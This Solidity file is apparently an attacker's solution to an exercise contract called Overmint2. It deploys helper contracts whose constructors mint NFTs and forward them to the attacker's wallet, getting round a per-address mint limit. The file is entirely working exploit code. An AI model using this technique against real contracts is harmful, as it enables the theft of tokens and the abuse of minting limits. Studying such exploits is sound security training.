// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./Overmint2.sol";

contract Overmint2Helper {
    constructor(Overmint2 victim, address recipient, uint256 mintCount, uint256 startTokenId) {
        for (uint256 i = 0; i < mintCount; i++) {
            victim.mint();
        }
        for (uint256 i = 0; i < mintCount; i++) {
            IERC721(address(victim)).transferFrom(address(this), recipient, startTokenId + i);
        }
    }
}

contract Overmint2Attacker {
    constructor(address _victim) {
        Overmint2 victim = Overmint2(_victim);
        address attackerWallet = msg.sender;

        // Helper1 mints 4 (tokens 1-4), Helper2 mints 1 (token 5)
        // Each helper transfers its NFTs to attackerWallet
        new Overmint2Helper(victim, attackerWallet, 4, 1);
        new Overmint2Helper(victim, attackerWallet, 1, 5);
    }
}
